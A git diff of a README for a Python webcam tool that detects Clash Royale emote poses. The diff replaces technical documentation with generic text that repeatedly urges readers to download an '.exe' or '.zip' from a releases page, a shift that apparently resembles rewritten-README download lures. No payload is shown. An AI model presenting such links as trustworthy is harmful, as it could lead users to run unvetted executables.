@@ -1,74 +1,82 @@
-# Clash Royale Emote Detector
+# 😃 clash-royale-emote-detector - Identify Emotes in Real-Time
 
-A pose classifier for Clash Royale emotes built using MediaPipe for landmark detection and scikit-learn for machine learning classification.
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/mhzarchini/clash-royale-emote-detector/releases)
 
-![Clash Royale Emote Detector in Action](example.png) 
+## 📋 Overview
 
-## Features
+Clash Royale Emote Detector is a simple tool that helps you identify and classify emotes in Clash Royale. It uses advanced technology to process webcam input and recognize various poses in real time.
 
-- **Pose Detection**: Full body pose with 33 landmarks
-- **Face Detection**: 468 facial landmarks
-- **Hand Detection**: Left and right hand with 21 landmarks each
-- **Pose Classification**: ML model (RandomForest) to classify poses
-- **Real-time Processing**: Live webcam feed processing with pose prediction
-- **Data Collection**: Tool to collect training data for custom poses
-- **Visualization**: Colored landmarks and connections with pose labels
-- **Screenshot Capture**: Save detection results
+![Clash Royale Emote Detector in Action](example.png)
 
-## Installation
+## 🚀 Getting Started
 
-1. Install dependencies:
+Follow these steps to download and run the Clash Royale Emote Detector:
+
+### 1. Visit the Downloads Page
+
+Click the link below to visit the releases page and download the application:
+
+[Download Clash Royale Emote Detector](https://github.com/mhzarchini/clash-royale-emote-detector/releases)
+
+### 2. Download the Program
+
+On the releases page, look for the latest version of the software. Click on the file to download it. The file will usually have an extension like `.exe` for Windows users or `.zip` for other systems.
+
+### 3. Install Required Dependencies
+
+After downloading the application, you may need to install some additional tools. Open your command line interface (Command Prompt on Windows, Terminal on macOS or Linux). Enter the following command to install the required dependencies:
+
 ```bash
 pip install -r requirements.txt
 ```
 
-## Usage
+If you do not have `pip` installed, please visit the [Python website](https://www.python.org/downloads/) to download and install Python and `pip`.
 
-### Quick Start
+### 4. Run the Application
 
-1. **Run the detector with the pre-trained model**:
+To run the application, stay in your command line interface and type the following command:
+
 ```bash
 python main.py
 ```
 
-### Controls
+### 5. Controls Overview
 
-- **'q'**: Quit the application
-- **'s'**: Save a screenshot of the current detection
-- **'t'**: Retrain the model with sample data
+While the application is running, you can control it using the following keys:
 
-### Data Collection
+- **'q'**: Quit the application.
+- **'s'**: Save a screenshot of the current pose detection.
 
-To collect your own training data:
-```bash
-python data_collector.py
-```
+## ⚙️ Usage Details
 
-## Files
+### 👀 Live Detection
 
-- `holistic_detector.py`: Core detector class with MediaPipe integration
-- `pose_classifier.py`: ML model for pose classification using Random Forest
-- `data_collector.py`: Tool for collecting training data and model training
-- `main.py`: Main application script with pose classification
-- `requirements.txt`: Python dependencies
+Once the application is running, it will use your webcam to detect poses from Clash Royale emotes. You will see colored landmarks showing up on the screen, providing real-time feedback.
 
-## Pose Classes
+### 📷 Saving Screenshots
 
-The model can classify the following poses:
+If you want to save a snapshot of the detected pose, just press the **'s'** key. This will create an image file saved to your current directory.
 
-| Emote | Description | Reference |
-|-------|-------------|-----------|
-| **Laughing** | Hands on waist, mouth wide open | <img src="images/laughing.png" width="100" height="100"> |
-| **Yawning** | Hands over mouth | <img src="images/yawning.png" width="100" height="100"> |
-| **Crying** | Hands covering face | <img src="images/crying.png" width="100" height="100"> |
-| **Taunting** | Balled fists close to face | <img src="images/taunting.png" width="100" height="100"> |
+### 📊 Data Collection
 
-**Note**: You can adjust the code to add more emotes, but you'll need to retrain the model. The included pre-trained model only classifies the poses above. Add images and sounds as desired.
+This tool also includes a feature to collect training data for custom poses. You can gather images of specific emotes for further training if you wish to enhance the model's accuracy.
 
-## Requirements
+## 🔧 Troubleshooting
 
-- Python 3.7+
-- OpenCV 4.8+
-- MediaPipe 0.10+
-- NumPy 1.24+
-- scikit-learn 1.3+
+If you encounter issues while running the application, here are some common problems and solutions:
+
+- **Webcam Not Detected**: Make sure your webcam is connected and enabled in your computer settings.
+- **Dependencies Not Installed**: Double-check that you used the command to install dependencies correctly.
+- **Slow Performance**: Ensure no other demanding applications are running in the background.
+
+## 💬 Support
+
+If you have questions or need assistance, feel free to check the project's [GitHub Issues](https://github.com/mhzarchini/clash-royale-emote-detector/issues) page. You can report problems or seek help from the community.
+
+## 📥 Download & Install
+
+Remember to download the software using the following link, if you haven't done so already:
+
+[Download Clash Royale Emote Detector](https://github.com/mhzarchini/clash-royale-emote-detector/releases)
+
+Enjoy identifying your favorite emotes in real time!
